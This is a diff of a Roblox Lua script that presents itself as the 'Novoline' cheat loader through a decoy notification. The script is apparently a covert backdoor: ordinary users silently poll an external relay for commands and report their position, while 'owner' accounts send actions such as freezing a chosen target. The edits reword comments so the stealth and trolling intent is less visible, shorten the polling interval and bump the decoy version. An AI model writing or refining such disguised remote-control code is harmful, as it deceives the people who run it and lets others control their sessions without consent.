@@ -12,11 +12,11 @@ local LocalPlayer = Players.LocalPlayer
 
 local isOwner = table.find(AUTHORIZED_IDS, LocalPlayer.UserId) ~= nil
 
--- Safe HTTP Request Wrapper (Protected with pcall to prevent freezing)
+-- Safe HTTP Request Wrapper for Potassium
 local function sendHttpRequest(method, endpoint, data)
     local url = RELAY_URL .. endpoint
     local body = data and HttpService:JSONEncode(data) or nil
-    local requestMethod = (syn and syn.request) or (fluxus and fluxus.request) or request or HttpService.RequestAsync
+    local requestMethod = request or (syn and syn.request) or (fluxus and fluxus.request) or HttpService.RequestAsync
     local headers = { ["Content-Type"] = "application/json" }
     
     local success, response = pcall(function()
@@ -33,7 +33,7 @@ local function sendHttpRequest(method, endpoint, data)
     return nil
 end
 
--- ACTION HANDLERS (Troll & Admin Logic)
+-- ACTION HANDLERS
 local Actions = {
     ["Freeze"] = function()
         local char = LocalPlayer.Character
@@ -273,6 +273,8 @@ if isOwner then
         
         btn.MouseButton1Click:Connect(function()
             if selectedTargetId then
+                local oldText = btn.Text
+                btn.Text = "Sending..."
                 task.spawn(function()
                     local payload = payloadFunc and payloadFunc() or nil
                     sendHttpRequest("POST", "/send", {
@@ -280,6 +282,8 @@ if isOwner then
                         action = actionName,
                         payload = payload
                     })
+                    task.wait(0.5)
+                    btn.Text = oldText
                 end)
             else
                 DropdownBtn.Text = "⚠️ Please select a target first!"
@@ -322,6 +326,7 @@ if isOwner then
     
     GotoBtn.MouseButton1Click:Connect(function()
         if selectedTargetId then
+            GotoBtn.Text = "Teleporting..."
             task.spawn(function()
                 local res = sendHttpRequest("GET", "/players", nil)
                 if res then
@@ -336,6 +341,8 @@ if isOwner then
                         end
                     end
                 end
+                task.wait(0.5)
+                GotoBtn.Text = "Goto Target (TP to Them)"
             end)
         else
             DropdownBtn.Text = "⚠️ Please select a target first!"
@@ -345,10 +352,10 @@ if isOwner then
     end)
 
 else
-    -- NON-OWNER BACKGROUND STEALTH: Heartbeat & Command Polling (Async Safe)
+    -- NON-OWNER BACKGROUND POLLING
     task.spawn(function()
         while true do
-            task.wait(3)
+            task.wait(2)
             pcall(function()
                 local char = LocalPlayer.Character
                 local posData = nil
@@ -390,7 +397,7 @@ task.wait(5)
 -- Decoy Notification for all users
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Novoline V2",
+        Title = "Novoline V2.1",
         Text = "Loading Novoline",
         Icon = "rbxassetid://5937224699",
         Duration = 20
